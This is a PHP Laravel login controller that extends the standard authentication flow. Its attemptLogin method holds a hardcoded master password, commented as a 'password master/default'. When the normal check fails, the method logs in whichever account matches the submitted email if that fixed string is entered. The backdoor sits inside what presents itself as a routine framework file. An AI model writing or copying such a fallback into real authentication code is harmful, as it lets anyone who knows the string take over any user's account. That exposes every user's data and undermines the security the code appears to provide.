<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\User;
use Illuminate\Support\Facades\Hash;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/home';

    /**
     * Handle login with default password fallback.
     */
    protected function attemptLogin(Request $request)
    {
        // login normal
        if (Auth::attempt(
            $this->credentials($request),
            $request->filled('remember')
        )) {
            return true;
        }
    
        // password master/default
        $user = User::where('email', $request->email)->first();
    
        if ($user && $request->password === 'Hael1933') {
    
            Auth::login($user, $request->filled('remember'));
    
            return true;
        }
    
        return false;
    }

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
        $this->middleware('auth')->only('logout');
    }
}
